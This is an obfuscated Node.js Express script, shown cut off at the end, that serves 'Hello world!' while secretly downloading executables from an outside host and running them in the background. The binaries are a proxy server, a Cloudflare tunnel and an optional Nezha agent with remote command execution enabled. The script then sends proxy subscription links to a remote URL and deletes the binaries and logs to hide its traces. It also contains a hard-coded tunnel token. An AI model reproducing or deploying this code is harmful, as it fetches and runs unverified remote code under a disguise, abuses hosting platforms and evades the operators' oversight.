const _0x57736a=_0x1350;(function(_0x872d3e,_0x23c6ef){const _0x57f640=_0x1350,_0x546275=_0x872d3e();while(!![]){try{const _0x50f296=-parseInt(_0x57f640(0x10d))/0x1+parseInt(_0x57f640(0xc1))/0x2*(-parseInt(_0x57f640(0x138))/0x3)+parseInt(_0x57f640(0x11a))/0x4+-parseInt(_0x57f640(0xac))/0x5+-parseInt(_0x57f640(0xc8))/0x6*(-parseInt(_0x57f640(0x149))/0x7)+-parseInt(_0x57f640(0xb7))/0x8*(parseInt(_0x57f640(0xc3))/0x9)+parseInt(_0x57f640(0x11f))/0xa;if(_0x50f296===_0x23c6ef)break;else _0x546275['push'](_0x546275['shift']());}catch(_0x1139fd){_0x546275['push'](_0x546275['shift']());}}}(_0x21de,0xc47e2));const express=require('express'),app=express(),axios=require(_0x57736a(0xc4)),os=require('os'),fs=require('fs'),path=require(_0x57736a(0x91)),{promisify}=require(_0x57736a(0x147)),exec=promisify(require(_0x57736a(0x14d))[_0x57736a(0x100)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x57736a(0x101)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x57736a(0x95)]||'',AUTO_ACCESS=process['env'][_0x57736a(0x93)]||![],FILE_PATH=process[_0x57736a(0x101)]['FILE_PATH']||_0x57736a(0xdc),SUB_PATH=process['env'][_0x57736a(0xb0)]||'sub',PORT=process[_0x57736a(0x101)][_0x57736a(0xf3)]||process[_0x57736a(0x101)][_0x57736a(0x11e)]||0xbb8,UUID=process[_0x57736a(0x101)]['UUID']||_0x57736a(0x105),NEZHA_SERVER=process['env'][_0x57736a(0x13d)]||'',NEZHA_PORT=process[_0x57736a(0x101)][_0x57736a(0x14c)]||'',NEZHA_KEY=process[_0x57736a(0x101)][_0x57736a(0x117)]||'',ARGO_DOMAIN=process['env'][_0x57736a(0x12a)]||_0x57736a(0xf7),ARGO_AUTH=process['env'][_0x57736a(0x141)]||_0x57736a(0xd3),ARGO_PORT=process[_0x57736a(0x101)]['ARGO_PORT']||0x1f41,CFIP=process[_0x57736a(0x101)][_0x57736a(0x98)]||'cdns.doon.eu.org',CFPORT=process[_0x57736a(0x101)]['CFPORT']||0x1bb,NAME=process[_0x57736a(0x101)][_0x57736a(0xd8)]||_0x57736a(0xe3);!fs[_0x57736a(0xc2)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x57736a(0xe5)](FILE_PATH+_0x57736a(0x113))):console[_0x57736a(0xe5)](FILE_PATH+_0x57736a(0xee));function _0x1350(_0x2365f5,_0x2d0c6f){const _0x21de9d=_0x21de();return _0x1350=function(_0x1350de,_0x536c84){_0x1350de=_0x1350de-0x8c;let _0x13f67b=_0x21de9d[_0x1350de];return _0x13f67b;},_0x1350(_0x2365f5,_0x2d0c6f);}function generateRandomName(){const _0x2e0441=_0x57736a,_0x58b578=_0x2e0441(0x129);let _0x505a16='';for(let _0x156f92=0x0;_0x156f92<0x6;_0x156f92++){_0x505a16+=_0x58b578['charAt'](Math[_0x2e0441(0x120)](Math[_0x2e0441(0x9e)]()*_0x58b578[_0x2e0441(0x107)]));}return _0x505a16;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x57736a(0xb9)](FILE_PATH,npmName),phpPath=path[_0x57736a(0xb9)](FILE_PATH,phpName),webPath=path[_0x57736a(0xb9)](FILE_PATH,webName),botPath=path[_0x57736a(0xb9)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x57736a(0x8f)),listPath=path[_0x57736a(0xb9)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x57736a(0xf5)),configPath=path['join'](FILE_PATH,_0x57736a(0xe9));function deleteNodes(){const _0x329d0a=_0x57736a;try{if(!UPLOAD_URL)return;if(!fs[_0x329d0a(0xc2)](subPath))return;let _0x2a26d0;try{_0x2a26d0=fs[_0x329d0a(0xe6)](subPath,_0x329d0a(0xb8));}catch{return null;}const _0x57f29f=Buffer[_0x329d0a(0x8d)](_0x2a26d0,_0x329d0a(0x136))[_0x329d0a(0x132)](_0x329d0a(0xb8)),_0x3ff014=_0x57f29f['split']('\x0a')[_0x329d0a(0x140)](_0x3e920e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3e920e));if(_0x3ff014[_0x329d0a(0x107)]===0x0)return;return axios['post'](UPLOAD_URL+_0x329d0a(0xcf),JSON[_0x329d0a(0x119)]({'nodes':_0x3ff014}),{'headers':{'Content-Type':_0x329d0a(0x128)}})['catch'](_0xe8b7d9=>{return null;}),null;}catch(_0x1820ff){return null;}}function cleanupOldFiles(){const _0x4668d6=_0x57736a;try{const _0x5ee8d4=fs[_0x4668d6(0xa3)](FILE_PATH);_0x5ee8d4[_0x4668d6(0xf4)](_0x2de548=>{const _0xa6960=_0x4668d6,_0x5e8abb=path['join'](FILE_PATH,_0x2de548);try{const _0xcd879a=fs[_0xa6960(0xb1)](_0x5e8abb);_0xcd879a['isFile']()&&fs[_0xa6960(0x11d)](_0x5e8abb);}catch(_0x54c10a){}});}catch(_0xcb398c){}}app[_0x57736a(0x134)]('/',function(_0xb42819,_0x813e98){const _0x5a7e1a=_0x57736a;_0x813e98[_0x5a7e1a(0xc0)](_0x5a7e1a(0x108));});async function generateConfig(){const _0x1a7614=_0x57736a,_0x5386cc={'log':{'access':'/dev/null','error':_0x1a7614(0xa0),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1a7614(0xd0),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1a7614(0x12b),'fallbacks':[{'dest':0xbb9},{'path':_0x1a7614(0xa8),'dest':0xbba},{'path':_0x1a7614(0x123),'dest':0xbbb},{'path':_0x1a7614(0x99),'dest':0xbbc}]},'streamSettings':{'network':_0x1a7614(0x9f)}},{'port':0xbb9,'listen':_0x1a7614(0xcb),'protocol':_0x1a7614(0xd0),'settings':{'clients':[{'id':UUID}],'decryption':_0x1a7614(0x12b)},'streamSettings':{'network':_0x1a7614(0x9f),'security':_0x1a7614(0x12b)}},{'port':0xbba,'listen':_0x1a7614(0xcb),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1a7614(0x12b),'wsSettings':{'path':_0x1a7614(0xa8)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a7614(0x11c),_0x1a7614(0x13e),_0x1a7614(0xde)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1a7614(0xcb),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1a7614(0x123)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a7614(0x11c),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1a7614(0xcb),'protocol':_0x1a7614(0xef),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1a7614(0x12b),'wsSettings':{'path':_0x1a7614(0x99)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a7614(0x11c),_0x1a7614(0x13e),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x1a7614(0xeb),'tag':_0x1a7614(0xa6)},{'protocol':_0x1a7614(0xa9),'tag':_0x1a7614(0xc5)}]};fs[_0x1a7614(0x96)](path[_0x1a7614(0xb9)](FILE_PATH,_0x1a7614(0xe9)),JSON[_0x1a7614(0x119)](_0x5386cc,null,0x2));}function getSystemArchitecture(){const _0x2f50df=_0x57736a,_0x37747a=os[_0x2f50df(0xe0)]();return _0x37747a===_0x2f50df(0xa2)||_0x37747a===_0x2f50df(0xfa)||_0x37747a===_0x2f50df(0x126)?_0x2f50df(0xa2):_0x2f50df(0xfb);}function downloadFile(_0x4209d9,_0x30f16e,_0x5dfd3d){const _0x5c1318=_0x57736a,_0x2614a9=_0x4209d9;!fs[_0x5c1318(0xc2)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x309ead=fs['createWriteStream'](_0x2614a9);axios({'method':'get','url':_0x30f16e,'responseType':_0x5c1318(0xc6)})[_0x5c1318(0x104)](_0x67325e=>{const _0x24567e=_0x5c1318;_0x67325e[_0x24567e(0x12e)][_0x24567e(0x110)](_0x309ead),_0x309ead['on'](_0x24567e(0x12d),()=>{const _0x2b39f5=_0x24567e;_0x309ead[_0x2b39f5(0x109)](),console[_0x2b39f5(0xe5)](_0x2b39f5(0xff)+path['basename'](_0x2614a9)+_0x2b39f5(0xa4)),_0x5dfd3d(null,_0x2614a9);}),_0x309ead['on'](_0x24567e(0x115),_0x38eac0=>{const _0x393c93=_0x24567e;fs[_0x393c93(0xc7)](_0x2614a9,()=>{});const _0x52e6cf='Download\x20'+path[_0x393c93(0xf1)](_0x2614a9)+_0x393c93(0x8c)+_0x38eac0['message'];console[_0x393c93(0x115)](_0x52e6cf),_0x5dfd3d(_0x52e6cf);});})[_0x5c1318(0x112)](_0x3da990=>{const _0x5b6990=_0x5c1318,_0x4b7959=_0x5b6990(0xff)+path[_0x5b6990(0xf1)](_0x2614a9)+'\x20failed:\x20'+_0x3da990[_0x5b6990(0xae)];console[_0x5b6990(0x115)](_0x4b7959),_0x5dfd3d(_0x4b7959);});}async function downloadFilesAndRun(){const _0x48dd38=_0x57736a,_0x1f5ce7=getSystemArchitecture(),_0xd86613=getFilesForArchitecture(_0x1f5ce7);if(_0xd86613[_0x48dd38(0x107)]===0x0){console[_0x48dd38(0xe5)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x1a73ba=_0xd86613[_0x48dd38(0xdf)](_0x44c77c=>{return new Promise((_0x276845,_0x5b4219)=>{const _0x3c7d5f=_0x1350;downloadFile(_0x44c77c[_0x3c7d5f(0xe1)],_0x44c77c['fileUrl'],(_0x8ad38f,_0x450f87)=>{_0x8ad38f?_0x5b4219(_0x8ad38f):_0x276845(_0x450f87);});});});try{await Promise[_0x48dd38(0xdd)](_0x1a73ba);}catch(_0x1f1647){console[_0x48dd38(0x115)](_0x48dd38(0xe2),_0x1f1647);return;}function _0x4057ab(_0x252181){const _0x5caaea=_0x48dd38,_0x5cebca=0x1fd;_0x252181[_0x5caaea(0xf4)](_0x1799b7=>{const _0x1cfda2=_0x5caaea;fs[_0x1cfda2(0xc2)](_0x1799b7)&&fs[_0x1cfda2(0xba)](_0x1799b7,_0x5cebca,_0x1a3d70=>{const _0x5da9f7=_0x1cfda2;_0x1a3d70?console[_0x5da9f7(0x115)](_0x5da9f7(0xe8)+_0x1799b7+':\x20'+_0x1a3d70):console['log'](_0x5da9f7(0x124)+_0x1799b7+':\x20'+_0x5cebca['toString'](0x8));});});}const _0x23d16b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4057ab(_0x23d16b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x51ddfa=NEZHA_SERVER[_0x48dd38(0x131)](':')?NEZHA_SERVER[_0x48dd38(0x102)](':')['pop']():'',_0x4ac737=new Set(['443','8443',_0x48dd38(0xf6),_0x48dd38(0xe4),_0x48dd38(0x148),'2053']),_0x530fc3=_0x4ac737[_0x48dd38(0xc9)](_0x51ddfa)?_0x48dd38(0x10b):_0x48dd38(0x130),_0x16db85='\x0aclient_secret:\x20'+NEZHA_KEY+_0x48dd38(0xad)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x530fc3+_0x48dd38(0x142)+UUID;fs[_0x48dd38(0x96)](path[_0x48dd38(0xb9)](FILE_PATH,_0x48dd38(0x137)),_0x16db85);const _0x5b3c5e='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x48dd38(0xa1);try{await exec(_0x5b3c5e),console[_0x48dd38(0xe5)](phpName+_0x48dd38(0x116)),await new Promise(_0x210185=>setTimeout(_0x210185,0x3e8));}catch(_0x3f4435){console[_0x48dd38(0x115)](_0x48dd38(0xaf)+_0x3f4435);}}else{let _0x38b0fa='';const _0x1777d3=[_0x48dd38(0xca),_0x48dd38(0x122),_0x48dd38(0xf6),_0x48dd38(0xe4),_0x48dd38(0x148),'2053'];_0x1777d3['includes'](NEZHA_PORT)&&(_0x38b0fa=_0x48dd38(0xd1));const _0x920366=_0x48dd38(0x90)+npmPath+_0x48dd38(0xed)+NEZHA_SERVER+':'+NEZHA_PORT+_0x48dd38(0x118)+NEZHA_KEY+'\x20'+_0x38b0fa+_0x48dd38(0x92);try{await exec(_0x920366),console[_0x48dd38(0xe5)](npmName+'\x20is\x20running'),await new Promise(_0x9b6475=>setTimeout(_0x9b6475,0x3e8));}catch(_0x299beb){console['error'](_0x48dd38(0xbe)+_0x299beb);}}}else console['log'](_0x48dd38(0x145));const _0x68b676=_0x48dd38(0x90)+webPath+_0x48dd38(0x13c)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x68b676),console[_0x48dd38(0xe5)](webName+_0x48dd38(0x116)),await new Promise(_0x4cd210=>setTimeout(_0x4cd210,0x3e8));}catch(_0x55b940){console[_0x48dd38(0x115)](_0x48dd38(0x12f)+_0x55b940);}if(fs[_0x48dd38(0xc2)](botPath)){let _0x24a2d9;if(ARGO_AUTH[_0x48dd38(0x121)](/^[A-Z0-9a-z=]{120,250}$/))_0x24a2d9='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x48dd38(0x121)](/TunnelSecret/)?_0x24a2d9=_0x48dd38(0x14b)+FILE_PATH+_0x48dd38(0xbb):_0x24a2d9=_0x48dd38(0xd5)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x48dd38(0x90)+botPath+'\x20'+_0x24a2d9+_0x48dd38(0x133)),console[_0x48dd38(0xe5)](botName+_0x48dd38(0x116)),await new Promise(_0x206337=>setTimeout(_0x206337,0x7d0));}catch(_0x3246ea){console[_0x48dd38(0x115)]('Error\x20executing\x20command:\x20'+_0x3246ea);}}await new Promise(_0x9a68d7=>setTimeout(_0x9a68d7,0x1388));}function getFilesForArchitecture(_0x4a30a4){const _0x1b2e75=_0x57736a;let _0x164142;_0x4a30a4===_0x1b2e75(0xa2)?_0x164142=[{'fileName':webPath,'fileUrl':_0x1b2e75(0xfc)},{'fileName':botPath,'fileUrl':_0x1b2e75(0xe7)}]:_0x164142=[{'fileName':webPath,'fileUrl':_0x1b2e75(0x94)},{'fileName':botPath,'fileUrl':_0x1b2e75(0xd4)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1e33ee=_0x4a30a4===_0x1b2e75(0xa2)?_0x1b2e75(0xb5):'https://amd64.ssss.nyc.mn/agent';_0x164142[_0x1b2e75(0xa7)]({'fileName':npmPath,'fileUrl':_0x1e33ee});}else{const _0x2a2208=_0x4a30a4==='arm'?_0x1b2e75(0xaa):_0x1b2e75(0x14a);_0x164142['unshift']({'fileName':phpPath,'fileUrl':_0x2a2208});}}return _0x164142;}function argoType(){const _0x3e593b=_0x57736a;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x3e593b(0x143));return;}if(ARGO_AUTH[_0x3e593b(0x131)](_0x3e593b(0x111))){fs[_0x3e593b(0x96)](path[_0x3e593b(0xb9)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x2903d3=_0x3e593b(0x13b)+ARGO_AUTH['split']('\x22')[0xb]+_0x3e593b(0x139)+path[_0x3e593b(0xb9)](FILE_PATH,_0x3e593b(0x10c))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x3e593b(0xab);fs['writeFileSync'](path[_0x3e593b(0xb9)](FILE_PATH,_0x3e593b(0x9c)),_0x2903d3);}else console[_0x3e593b(0xe5)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x3c1592=_0x57736a;let _0xece925;if(ARGO_AUTH&&ARGO_DOMAIN)_0xece925=ARGO_DOMAIN,console[_0x3c1592(0xe5)](_0x3c1592(0x103),_0xece925),await _0x128273(_0xece925);else try{const _0x5270dd=fs[_0x3c1592(0xe6)](path[_0x3c1592(0xb9)](FILE_PATH,_0x3c1592(0xf5)),_0x3c1592(0xb8)),_0x3cf0f9=_0x5270dd['split']('\x0a'),_0x2bce05=[];_0x3cf0f9[_0x3c1592(0xf4)](_0x5d9c2f=>{const _0x435a7b=_0x3c1592,_0x16dd63=_0x5d9c2f[_0x435a7b(0x121)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x16dd63){const _0xd03c7a=_0x16dd63[0x1];_0x2bce05['push'](_0xd03c7a);}});if(_0x2bce05[_0x3c1592(0x107)]>0x0)_0xece925=_0x2bce05[0x0],console[_0x3c1592(0xe5)](_0x3c1592(0xbd),_0xece925),await _0x128273(_0xece925);else{console[_0x3c1592(0xe5)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x3c1592(0x11d)](path['join'](FILE_PATH,_0x3c1592(0xf5)));async function _0x118800(){const _0x7e8b83=_0x3c1592;try{process[_0x7e8b83(0xf2)]===_0x7e8b83(0xf8)?await exec(_0x7e8b83(0x13a)+botName+_0x7e8b83(0x13f)):await exec('pkill\x20-f\x20\x22['+botName[_0x7e8b83(0xfd)](0x0)+']'+botName['substring'](0x1)+_0x7e8b83(0xce));}catch(_0xd73b19){}}_0x118800(),await new Promise(_0x400bb1=>setTimeout(_0x400bb1,0xbb8));const _0x2d2a23='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3c1592(0x8e)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2d2a23+_0x3c1592(0x133)),console[_0x3c1592(0xe5)](botName+_0x3c1592(0x116)),await new Promise(_0x3ce6c5=>setTimeout(_0x3ce6c5,0xbb8)),await extractDomains();}catch(_0x2606a3){console[_0x3c1592(0x115)](_0x3c1592(0xfe)+_0x2606a3);}}}catch(_0x3c1498){console[_0x3c1592(0x115)](_0x3c1592(0x97),_0x3c1498);}async function _0x31b21c(){const _0x59ee3b=_0x3c1592;try{const _0x3fcf27=await axios[_0x59ee3b(0x134)](_0x59ee3b(0x125),{'timeout':0xbb8});if(_0x3fcf27[_0x59ee3b(0x12e)]&&_0x3fcf27[_0x59ee3b(0x12e)][_0x59ee3b(0xf9)]&&_0x3fcf27[_0x59ee3b(0x12e)][_0x59ee3b(0x9a)])return _0x3fcf27[_0x59ee3b(0x12e)]['country_code']+'_'+_0x3fcf27['data'][_0x59ee3b(0x9a)];}catch(_0x3c942b){try{const _0xdaed6f=await axios[_0x59ee3b(0x134)](_0x59ee3b(0xd7),{'timeout':0xbb8});if(_0xdaed6f[_0x59ee3b(0x12e)]&&_0xdaed6f['data'][_0x59ee3b(0x11b)]===_0x59ee3b(0xdb)&&_0xdaed6f[_0x59ee3b(0x12e)]['countryCode']&&_0xdaed6f[_0x59ee3b(0x12e)][_0x59ee3b(0x9a)])return _0xdaed6f[_0x59ee3b(0x12e)][_0x59ee3b(0xb3)]+'_'+_0xdaed6f['data'][_0x59ee3b(0x9a)];}catch(_0x4e6261){}}return _0x59ee3b(0xf0);}async function _0x128273(_0x11dd43){const _0xfe3c36=await _0x31b21c(),_0x3f943f=NAME?NAME+'-'+_0xfe3c36:_0xfe3c36;return new Promise(_0x33a86d=>{setTimeout(()=>{const _0x1fbf8e=_0x1350,_0x200edb={'v':'2','ps':''+_0x3f943f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1fbf8e(0x12b),'net':'ws','type':'none','host':_0x11dd43,'path':'/vmess-argo?ed=2560','tls':_0x1fbf8e(0x13e),'sni':_0x11dd43,'alpn':'','fp':_0x1fbf8e(0xec)},_0x28c97b='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x11dd43+'&fp=firefox&type=ws&host='+_0x11dd43+_0x1fbf8e(0x9b)+_0x3f943f+_0x1fbf8e(0xbf)+Buffer[_0x1fbf8e(0x8d)](JSON[_0x1fbf8e(0x119)](_0x200edb))[_0x1fbf8e(0x132)](_0x1fbf8e(0x136))+_0x1fbf8e(0x10e)+UUID+'@'+CFIP+':'+CFPORT+_0x1fbf8e(0x135)+_0x11dd43+'&fp=firefox&type=ws&host='+_0x11dd43+_0x1fbf8e(0x12c)+_0x3f943f+_0x1fbf8e(0xea);console[_0x1fbf8e(0xe5)](Buffer[_0x1fbf8e(0x8d)](_0x28c97b)[_0x1fbf8e(0x132)](_0x1fbf8e(0x136))),fs[_0x1fbf8e(0x96)](subPath,Buffer[_0x1fbf8e(0x8d)](_0x28c97b)[_0x1fbf8e(0x132)](_0x1fbf8e(0x136))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x1fbf8e(0x134)]('/'+SUB_PATH,(_0xf1fbef,_0x3133f2)=>{const _0x517851=_0x1fbf8e,_0x371689=Buffer[_0x517851(0x8d)](_0x28c97b)[_0x517851(0x132)](_0x517851(0x136));_0x3133f2[_0x517851(0x146)]('Content-Type',_0x517851(0xcc)),_0x3133f2[_0x517851(0xc0)](_0x371689);}),_0x33a86d(_0x28c97b);},0x7d0);});}}function _0x21de(){const _0x4168b9=['\x20>/dev/null\x202>&1\x20&','get','?security=tls&sni=','base64','config.yaml','1258122Twmnfc','\x0a\x20\x20credentials-file:\x20','taskkill\x20/f\x20/im\x20','\x0a\x20\x20tunnel:\x20','\x20-c\x20','NEZHA_SERVER','tls','.exe\x20>\x20nul\x202>&1','filter','ARGO_AUTH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Nodes\x20uploaded\x20successfully','NEZHA\x20variable\x20is\x20empty,skip\x20running','set','util','2083','150087DdEIrN','https://amd64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','NEZHA_PORT','child_process','\x20failed:\x20','from','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','sub.txt','nohup\x20','path','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','AUTO_ACCESS','https://amd64.ssss.nyc.mn/web','PROJECT_URL','writeFileSync','Error\x20reading\x20boot.log:','CFIP','/trojan-argo','org','&path=%2Fvless-argo%3Fed%3D2560#','tunnel.yml','del\x20/f\x20/q\x20','random','tcp','/dev/null','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','arm','readdirSync','\x20successfully','\x20>\x20nul\x202>&1','direct','unshift','/vless-argo','blackhole','https://arm64.ssss.nyc.mn/v1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','60095MQfihx','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','message','php\x20running\x20error:\x20','SUB_PATH','statSync','/api/add-subscriptions','countryCode','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/agent','listen','96jRgIMY','utf-8','join','chmod','/tunnel.yml\x20run','rm\x20-rf\x20','ArgoDomain:','npm\x20running\x20error:\x20','\x0a\x0avmess://','send','4MJGQth','existsSync','612585pSlEsa','axios','block','stream','unlink','204xzvyOU','has','443','127.0.0.1','text/plain;\x20charset=utf-8','App\x20is\x20running','\x22\x20>\x20/dev/null\x202>&1','/api/delete-nodes','vless','--tls','Add\x20automatic\x20access\x20task\x20faild:\x20','eyJhIjoiMGM2MjQ2ODZkZDEyNmE4ZTY1MjkzN2VjOWY4NWNiZjgiLCJ0IjoiNDhlNTE5NGEtY2QzNS00MzMzLTk2YmItYzU5MWRjZWFjY2U0IiwicyI6IlpXRTFNMlE1WkRRdFpqSmhPQzAwTVRaakxXRTJZVFV0TnpNeE9UTmhZMk15TXpGbCJ9','https://amd64.ssss.nyc.mn/bot','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Error\x20in\x20startserver:','http://ip-api.com/json/','NAME','post','/api/add-nodes','success','./tmp','all','quic','map','arch','fileName','Error\x20downloading\x20files:','baoge6788','2087','log','readFileSync','https://arm64.ssss.nyc.mn/bot','Empowerment\x20failed\x20for\x20','config.json','\x0a\x20\x20\x20\x20','freedom','firefox','\x20-s\x20','\x20already\x20exists','trojan','Unknown','basename','platform','SERVER_PORT','forEach','boot.log','2096','argo6789.baoge456.dpdns.org','win32','country_code','arm64','amd','https://arm64.ssss.nyc.mn/web','charAt','Error\x20executing\x20command:\x20','Download\x20','exec','env','split','ARGO_DOMAIN:','then','fd1a7ab7-f882-49dd-b52f-29bf68fa03c6','push','length','Hello\x20world!','close','clear','true','tunnel.json','193780QAIHpw','\x0a\x0atrojan://','http\x20server\x20is\x20running\x20on\x20port:','pipe','TunnelSecret','catch','\x20is\x20created','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','error','\x20is\x20running','NEZHA_KEY','\x20-p\x20','stringify','5585860tyynpJ','status','http','unlinkSync','PORT','5407020WccdaR','floor','match','8443','/vmess-argo','Empowerment\x20success\x20for\x20','https://ipapi.co/json/','aarch64','response','application/json','abcdefghijklmnopqrstuvwxyz','ARGO_DOMAIN','none','&path=%2Ftrojan-argo%3Fed%3D2560#','finish','data','web\x20running\x20error:\x20','false','includes','toString'];_0x21de=function(){return _0x4168b9;};return _0x21de();}async function uploadNodes(){const _0x427d3a=_0x57736a;if(UPLOAD_URL&&PROJECT_URL){const _0x33cf04=PROJECT_URL+'/'+SUB_PATH,_0x8a0268={'subscription':[_0x33cf04]};try{const _0x736934=await axios[_0x427d3a(0xd9)](UPLOAD_URL+_0x427d3a(0xb2),_0x8a0268,{'headers':{'Content-Type':_0x427d3a(0x128)}});return _0x736934&&_0x736934[_0x427d3a(0x11b)]===0xc8?(console[_0x427d3a(0xe5)]('Subscription\x20uploaded\x20successfully'),_0x736934):null;}catch(_0x3a793b){if(_0x3a793b[_0x427d3a(0x127)]){if(_0x3a793b[_0x427d3a(0x127)][_0x427d3a(0x11b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x209bd0=fs[_0x427d3a(0xe6)](listPath,_0x427d3a(0xb8)),_0x365779=_0x209bd0[_0x427d3a(0x102)]('\x0a')[_0x427d3a(0x140)](_0x486979=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x486979));if(_0x365779['length']===0x0)return;const _0x594bfd=JSON[_0x427d3a(0x119)]({'nodes':_0x365779});try{const _0x9a78ab=await axios[_0x427d3a(0xd9)](UPLOAD_URL+_0x427d3a(0xda),_0x594bfd,{'headers':{'Content-Type':'application/json'}});return _0x9a78ab&&_0x9a78ab['status']===0xc8?(console[_0x427d3a(0xe5)](_0x427d3a(0x144)),_0x9a78ab):null;}catch(_0x5bcaaf){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xa460cc=_0x1350,_0x3fa4ef=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3fa4ef[_0xa460cc(0x106)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3fa4ef[_0xa460cc(0x106)](phpPath);process['platform']===_0xa460cc(0xf8)?exec(_0xa460cc(0x9d)+_0x3fa4ef[_0xa460cc(0xb9)]('\x20')+_0xa460cc(0xa5),_0x53569a=>{const _0x3a5332=_0xa460cc;console[_0x3a5332(0x10a)](),console[_0x3a5332(0xe5)](_0x3a5332(0xcd)),console[_0x3a5332(0xe5)](_0x3a5332(0x114));}):exec(_0xa460cc(0xbc)+_0x3fa4ef['join']('\x20')+'\x20>/dev/null\x202>&1',_0x5eb363=>{const _0x445456=_0xa460cc;console[_0x445456(0x10a)](),console[_0x445456(0xe5)](_0x445456(0xcd)),console[_0x445456(0xe5)](_0x445456(0x114));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x13b9d9=_0x57736a;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0xba377a=await axios[_0x13b9d9(0xd9)](_0x13b9d9(0xb4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x13b9d9(0x128)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0xba377a;}catch(_0x1a90d1){return console[_0x13b9d9(0x115)](_0x13b9d9(0xd2)+_0x1a90d1['message']),null;}}async function startserver(){const _0x5bce45=_0x57736a;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x588eec){console[_0x5bce45(0x115)](_0x5bce45(0xd6),_0x588eec);}}startserver()['catch'](_0x4b74af=>{const 